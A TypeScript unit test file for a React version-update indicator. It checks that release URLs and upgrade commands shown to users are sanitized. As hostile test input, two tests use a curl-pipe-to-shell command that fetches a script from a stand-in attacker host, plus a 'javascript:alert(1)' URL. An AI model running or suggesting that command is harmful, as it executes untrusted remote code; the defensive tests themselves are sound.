import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { describe, expect, test } from 'bun:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { versionCheckQueryKey, type VersionCheckTarget } from '@/hooks/use-version-check';
import type { VersionCheckResult } from '@/types';

import { VersionUpdateContent, VersionUpdateIndicator } from './VersionUpdateIndicator';
import { manualVersionCheckToast } from './version-update-toast';
import {
  safeReleaseUrl,
  safeUpgradeCommand,
  TRUSTED_RELEASE_URL,
  TRUSTED_UPGRADE_COMMAND,
} from './version-update-security';

function result(overrides: Partial<VersionCheckResult> = {}): VersionCheckResult {
  return {
    target: 'server',
    target_id: 'server',
    current_version: 'v0.1.0',
    latest_version: 'v0.2.0',
    update_available: false,
    checked_at: '2026-05-10T00:00:00Z',
    install_method: 'service',
    recommended_channel: 'stable',
    recommended_action: 'none',
    commands: null,
    release_url: 'https://github.com/zsio/netsgo/releases',
    check_failed: false,
    refresh_failed: false,
    cache_source: 'fresh',
    reason: '',
    ...overrides,
  };
}

function renderIndicator(target: VersionCheckTarget, data?: VersionCheckResult) {
  const client = new QueryClient();
  if (data) client.setQueryData(versionCheckQueryKey(target), data);
  return renderToStaticMarkup(
    createElement(
      QueryClientProvider,
      { client },
      createElement(VersionUpdateIndicator, { target, label: 'Server version' }),
    ),
  );
}

describe('VersionUpdateIndicator', () => {
  test('allows only the expected GitHub releases URL shape', () => {
    expect(safeReleaseUrl('https://github.com/zsio/netsgo/releases/tag/v0.2.0')).toBe('https://github.com/zsio/netsgo/releases/tag/v0.2.0');
    expect(safeReleaseUrl('javascript:alert(1)')).toBe(TRUSTED_RELEASE_URL);
    expect(safeReleaseUrl('https://evil.example/zsio/netsgo/releases')).toBe(TRUSTED_RELEASE_URL);
  });

  test('allows only the canonical upgrade command', () => {
    expect(safeUpgradeCommand(TRUSTED_UPGRADE_COMMAND)).toBe(TRUSTED_UPGRADE_COMMAND);
    expect(safeUpgradeCommand(` ${TRUSTED_UPGRADE_COMMAND} `)).toBe(TRUSTED_UPGRADE_COMMAND);
    expect(safeUpgradeCommand('curl -fsSL https://evil.example/upgrade.sh | sh')).toBeNull();
  });

  test('manual check toast decision treats hard failures as errors', () => {
    expect(manualVersionCheckToast(result({ check_failed: true }))).toBe('error');
    expect(manualVersionCheckToast(null, true)).toBe('error');
  });

  test('manual check toast decision treats stale no-update refresh failures as errors', () => {
    expect(manualVersionCheckToast(result({
      refresh_failed: true,
      cache_source: 'stale_cache',
    }))).toBe('error');
  });

  test('manual check toast decision reports latest only for successful no-update checks', () => {
    expect(manualVersionCheckToast(result())).toBe('success');
    expect(manualVersionCheckToast(result({ update_available: true }))).toBeNull();
  });

  test('service update renders the unified upgrade command', () => {
    const target: VersionCheckTarget = {
      kind: 'server',
      version: 'v0.1.0',
      installMethod: 'service',
    };
    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
      target,
      data: result({
      update_available: true,
      recommended_action: 'run_script',
      commands: {
        command: TRUSTED_UPGRADE_COMMAND,
      },
      }),
    }));

    expect(markup).toContain('Run the following command on the Server machine to upgrade');
    expect(markup).toContain(TRUSTED_UPGRADE_COMMAND);
    expect(markup).not.toContain('China mirror');
    expect(markup).not.toContain('Global source');
    expect(markup).not.toContain('--source');
  });

  test('does not render hostile service commands as copyable trusted commands', () => {
    const target: VersionCheckTarget = {
      kind: 'server',
      version: 'v0.1.0',
      installMethod: 'service',
    };
    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
      target,
      data: result({
        update_available: true,
        recommended_action: 'run_script',
        commands: {
          command: 'curl -fsSL https://evil.example/upgrade.sh | sh',
        },
        release_url: 'javascript:alert(1)',
      }),
    }));

    expect(markup).not.toContain('evil.example');
    expect(markup).not.toContain('javascript:');
    expect(markup).toContain(TRUSTED_RELEASE_URL);
  });


  test('binary update does not render script commands', () => {
    const target: VersionCheckTarget = {
      kind: 'server',
      version: 'v0.1.0',
      installMethod: 'binary',
    };
    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
      target,
      data: result({
      update_available: true,
      install_method: 'binary',
      recommended_action: 'github_release',
      commands: null,
      }),
    }));

    expect(markup).toContain('GitHub Releases');
    expect(markup).not.toContain('scripts/upgrade.sh');
  });

  test('disabled offline target renders nothing', () => {
    const markup = renderIndicator({
      kind: 'client',
      id: 'client-1',
      version: 'v0.1.0',
      enabled: false,
    });

    expect(markup).toBe('');
  });
});
